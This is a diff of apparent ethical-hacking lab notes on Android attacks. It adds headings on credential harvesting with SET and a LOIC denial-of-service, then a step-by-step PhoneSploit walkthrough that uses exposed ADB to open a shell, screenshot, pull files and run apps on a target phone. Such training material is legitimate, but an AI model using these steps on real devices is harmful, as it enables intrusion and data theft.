@@ -20,11 +20,40 @@ Mobile devices allow communication between users on radio frequencies, whether G
 
 ==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
 
+# Harvest Users’ Credentials using the Social-Engineer Toolkit
+# Launch a DoS Attack on a Target machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
 
+==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
 
+# Exploit the Android Platform through ADB using PhoneSploit
+-------------------------------------------------------------
+Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.
+Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
+>>> PARROT MACHINE [ATTACKER/10.10.1.19]
+1. sudo su >> cd PhoneSploit >> python3 -m pip install colorama(to install the dependency)  >> python3 phonesploit.py
+2. PhoneSploit main menu options appear : 
+  >> [3] Connect a new phone  (if you are getting Connection timed out error, then type 3 again and press Enter. If you do not get any option, then type 3 and press Enter again, until you get Enter a phones ip address option.)
+    > Enter a phones ip address : 10.10.1.14 [Target Android Machine IP]  (You will see that the target Android device (in this case, 10.10.1.14) is connected through port number 5555.)
+  >> [4] Access Shell on a phone 
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]  (You can observe that a shell command line appears)
+    > pwd   > ls   > cd sdcard   > ls   > cd Download  > ls (/sdcard/Download/images.jpeg)    > exit(exit shell)
+  >> [7] Screen Shot a picture on a phone
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]
+    > Enter where you would like the screenshot to be saved, type : /home/attacker/Desktop  (you can see the screenshot at saved location (here, Desktop))
+  >> [9] Pull folders from phone to pc
+    > Enter a device name (file pull) : 10.10.1.14 [Target Android Machine IP]
+    > Enter a file location on a device (file pull) : /sdcard/Download/images.jpeg
+    > Enter where you would like the file to be saved (file pull) : /home/attacker/Desktop
+  >> [14] List all apps on a phone  
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]     (displaying the installed apps on the target Android device)
+  >> [15] Run an app
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]
+    > Enter the package name : com.android.calculator2      (com.snapchat.android, getting through the previous option {[14] List all apps on a phone})
+  >>  p : navigate to additional PhoneSploit options on the Next Page
+  >> [18] Show Mac/Inet
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]
+  >> [21] NetStat
+    > Enter a device name : 10.10.1.14 [Target Android Machine IP]
 
-
-
-
-
-
+For demonstration purposes, in this task, we are exploiting the Android emulator machine. However, in real life, attackers use the Shodan search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.
+==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
